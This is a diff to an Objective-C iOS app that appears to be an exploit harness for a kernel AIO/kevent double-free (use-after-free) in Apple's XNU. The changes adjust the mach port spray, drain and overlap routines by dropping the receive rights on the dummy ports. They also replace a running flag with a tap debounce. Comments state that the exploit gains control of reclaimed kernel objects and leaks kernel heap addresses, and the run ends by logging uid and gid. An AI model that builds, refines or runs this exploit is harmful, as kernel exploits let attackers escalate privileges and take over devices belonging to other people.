@@ -3670,6 +3670,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayRecv) == KERN_SUCCESS) {
         mach_port_t dummy;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+            mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
             if (mach_port_insert_right(mach_task_self_, sprayRecv, dummy,
                                         MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
                 spraySend = dummy;
@@ -5670,16 +5671,15 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
-static int _aioUafRunning = 0;
+static int64_t _aioUafLastRun = 0;
 
 - (void)aioUafTapped {
-    @synchronized(self) {
-        if (_aioUafRunning) {
-            [self appendLog:@"⚠ Already running — ignoring tap"];
-            return;
-        }
-        _aioUafRunning = 1;
+    int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+    if (now - _aioUafLastRun < 3000) {
+        [self appendLog:@"⚠ Debounced — ignoring duplicate tap"];
+        return;
     }
+    _aioUafLastRun = now;
 
     [self appendLog:@"\n========== AIO Kevent Double-Free v10 =========="];
 
@@ -5698,7 +5698,6 @@ static int _aioUafRunning = 0;
     int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create temp file"];
-        _aioUafRunning = 0;
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
             [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
@@ -5878,10 +5877,9 @@ static int _aioUafRunning = 0;
         drainRecv[p] = MACH_PORT_NULL;
         drainSend[p] = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
-            // Allocate a sacrificial port to get a fresh name, then overwrite it
-            // with the send right for drainRecv[p].
             mach_port_t dummy;
             if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+                mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
                 if (mach_port_insert_right(mach_task_self_, drainRecv[p], dummy,
                                             MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
                     drainSend[p] = dummy;
@@ -5895,6 +5893,7 @@ static int _aioUafRunning = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
         mach_port_t dummy;
         if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
+            mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
             if (mach_port_insert_right(mach_task_self_, overlapRecv, dummy,
                                         MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
                 overlapSend = dummy;
@@ -6068,7 +6067,6 @@ static int _aioUafRunning = 0;
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
     [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
-            _aioUafRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
                 [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
